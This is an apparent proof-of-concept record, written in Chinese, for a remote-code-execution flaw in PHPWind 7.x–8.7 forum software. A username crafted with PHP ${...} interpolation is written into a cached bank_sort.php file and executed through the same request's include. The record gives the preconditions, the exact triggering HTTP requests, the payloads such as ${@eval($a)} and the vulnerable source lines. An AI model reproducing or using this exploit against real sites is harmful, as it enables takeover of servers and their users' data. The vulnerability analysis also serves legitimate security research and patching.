# PHPWind 7.x hack/bank savearray → data/bbscache/bank_sort.php 用户名注入（写码+同请求include）

- **code**: phpwind-7.x-hack-bank-savearray-data-bbscache-bank_sort.php-用户名注入-写码-同请求include
- **kind**: poc
- **category**: rce
- **component**: PHPWind 7.3.2 / 7.5 SP3 / 8.7
- **versions**: 7.3.2 - 8.7.1（8.7 源码逐行核对未修）
- **severity**: critical
- **language**: php
- **source**: self
- **verified_note**: 源码级确认（7.5 SP3 + 8.7 对照），未对目标发包验证。目标为 7.3.2，该文件在 7.3.2 是否存在需 1 包探测 example.com?H_name=bank 是否返回银行页面（而非 hack_error）。
- **path**: pocs/phpwind-7.x-hack-bank-savearray-data-bbscache-bank_sort.php-用户名注入-写码-同请求include/poc.php
- **tags**: phpwind,savearray,变量插值,写码执行,bbscache,8.7未修
- **created_at**: 2026-10-06T11:37:16.119Z

## 描述

hack/bank/example.com:55-77 把 pw_members.username 经 savearray() 拼进 data/bbscache/bank_sort.php 的双引号 PHP 串，同一请求第 76 行 include。savearray()（362-373 行）只做 addslashes()，转义 " ' \ NUL 但不转义美元符 → 双引号串内 ${...} 会被 PHP 变量插值求值。载体字段只取存款/定期存款排行前 $bk_num(默认10) 的 username。长度上限：rg_namelen 默认 '3	12'（lang/install_wind.sql:524）即 12 字节；8.7 lang/install_wind.sql:1532 同为 3	12。只有 addslashes 不阻挡的 ${expr} 形态可用，且 addslashes 会把 \\ 写成 \\\\ 使长度翻倍。writeover() 落盘后 @chmod 0777（require/target105.example.com:240），文件 web 可达。

## 用法

```
前置：① 已有前台账号；② pw_memberinfo 中该 uid 的 deposit 或 ddeposit 非 0（bank/example.com:59/67 的 if 才会把它写进数组）；③ 排行能进前 $bk_num 名。
请求1（触发写入+执行，1 个包即可，因为第 76 行 include 无条件执行）：
  GET /bbs/example.com?H_name=bank HTTP/1.1
  Host: example.com
  Cookie: <登录后的 winduser/... cookie>
请求2（若已存在 bank_sort.php 且未过期，第 55 行条件不成立则不会重写，但 76 行仍会 include → 依然执行）：
  GET /bbs/example.com?H_name=bank
回显位置：bank 页面顶部排行榜表格内，username 列输出求值结果。
若 payload 为 ${phpinfo()}（正好 12 字节）则整页出现 phpinfo 表格。
```

## 正文

```
// hack/bank/example.com (7.5 SP3, 与 8.7 逐行同)
// --- 写入+同请求 include ---
55: if (!$bk_per || $timestamp - pwFilemtime(D_P."data/bbscache/bank_sort.php") > $bk_per*3600) {
57:     $query = $db->query("SELECT i.uid,m.username,i.deposit,i.startdate FROM pw_memberinfo i LEFT JOIN pw_members m ON m.uid=i.uid ORDER BY i.deposit DESC LIMIT $bk_num");
61:             $_DESPOSTDB[] = array($deposit['uid'],$deposit['username'],$deposit['deposit'], $deposit['startdate']);
72:     $wirtedb = savearray('_DESPOSTDB',$_DESPOSTDB);
74:     writeover(D_P.'data/bbscache/bank_sort.php',"<?php\r\n".$wirtedb.'?>');
76: include(D_P."data/bbscache/bank_sort.php");     // <== 同请求 include

// --- 362-373: 唯一转义 ---
function savearray($name,$array) {
	$arraydb="\$$name=array(\r\n\t\t";
	foreach ($array as $value1) {
		$arraydb .= 'array(';
		foreach ($value1 as $value2) {
			$arraydb .= '"'.addslashes($value2).'",';   // addslashes 不转义 $
		}
		$arraydb .= "),\r\n\t\t";
	}
	$arraydb .= ");\r\n";
	return $arraydb;
}

// 生成的 bank_sort.php 形如：
<?php
$_DESPOSTDB=array(
  array("8916","${@eval($a)}","100","2010-01-01"),
);
?>

// writeover(): require/target105.example.com:231-241
function writeover($filename,$data,$method='rb+',$iflock=1,$check=1,$chmod=1){
	$filename = Pcv($filename,$check);   // Pcv 堵 :// \0 ..
	touch($filename); $handle = fopen($filename,$method);
	$iflock && flock($handle,LOCK_EX);
	fwrite($handle,$data);
	$method=='rb+' && ftruncate($handle,strlen($data));
	fclose($handle);
	$chmod && @chmod($filename,0777);    // ← 落盘 0777
}
```
